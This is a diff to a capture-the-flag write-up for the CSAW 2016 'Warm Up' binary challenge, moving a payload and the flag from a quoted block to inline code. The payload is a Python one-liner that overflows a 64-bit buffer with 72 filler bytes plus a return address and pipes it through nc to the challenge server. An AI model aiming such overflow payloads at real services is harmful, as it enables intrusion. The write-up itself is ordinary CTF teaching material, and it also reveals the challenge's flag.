@@ -18,11 +18,6 @@
 
 It is 64-bit so that we need to add "\x00" 4 times behind payload. 
 
-payload: 
-'''
-python -c 'print "a"*72 + "\x11\x06\x40\x00\x00\x00\x00\x00"' | nc pwn.chal.csaw.io 8000
--Warm Up-
-WOW:0x40060d
->FLAG{LET_US_BEGIN_CSAW_2016}'''
+payload: ```python -c 'print "a"*72 + "\x11\x06\x40\x00\x00\x00\x00\x00"' | nc pwn.chal.csaw.io 8000```
 
 Flag is ```FLAG{LET_US_BEGIN_CSAW_2016}```
